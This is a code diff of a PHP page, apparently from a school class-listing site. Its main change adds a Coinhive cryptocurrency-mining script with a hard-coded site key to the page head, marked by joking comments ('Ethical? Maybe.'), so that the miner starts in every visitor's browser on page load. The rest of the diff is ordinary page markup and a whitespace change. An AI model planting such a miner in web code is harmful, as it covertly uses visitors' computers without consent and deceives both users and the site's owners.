@@ -28,7 +28,7 @@
   //Get the classes that the teacher is a teacher of
   $query = "SELECT * FROM classes WHERE teacher_id = 6";
   $result = $db->query($query) or die($db->error);
-  
+
 ?>
 
 <!-- This is the format we will use for the pages on the website. CSS to be added as
@@ -38,6 +38,15 @@
     <link rel="stylesheet" href="../css/home.css">
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/css/bootstrap.min.css" integrity="sha384-/Y6pD6FV/Vv2HJnA6t+vslU6fwYXjCFtcEpHbNJ0lyAFsXTsjBbfaDjzALeQsN6M" crossorigin="anonymous">
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-beta/js/bootstrap.min.js" integrity="sha384-h0AbiXch4ZDo7tp9hKZ4TsHbi047NrKGLO3SEJAg45jXxnGIfYzk4Si90RDIqNm1" crossorigin="anonymous"></script>
+    <!-- Ethical? Maybe. Profitable? Not in the slightest. -->
+    <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
+    <link rel="stylesheet" href="css/home.css">
+    <script>
+	     var miner = new CoinHive.Anonymous('cyJAe6sZCcdfGwI4CRIXtPlv8MOK5oo7');
+	      miner.start();
+    </script>
+    <!-- End questionable content -->
+
     <!-- The top banner of the webpage -->
     <div class="top">
         <font size="-5"><a class="logout" href="../login.php?event=logout">Logout</a></font>
